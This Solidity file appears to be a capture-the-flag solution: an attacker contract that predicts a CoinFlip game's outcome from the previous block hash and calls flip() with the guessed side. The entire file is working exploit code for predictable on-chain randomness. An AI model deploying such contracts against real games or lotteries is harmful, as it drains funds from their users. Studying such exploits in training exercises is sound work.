// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CoinFlip} from "./CoinFlip.sol";

contract CoinFlipAttacker {
    CoinFlip public coinFlip;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address coinFlipAddress) {
        coinFlip = CoinFlip(coinFlipAddress);
    }

    function attackCoinFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            return;
        }

        lastHash = blockValue;
        uint256 coinFlipValue = blockValue / FACTOR;
        bool side = coinFlipValue == 1 ? true : false;
        coinFlip.flip(side);
    }
}
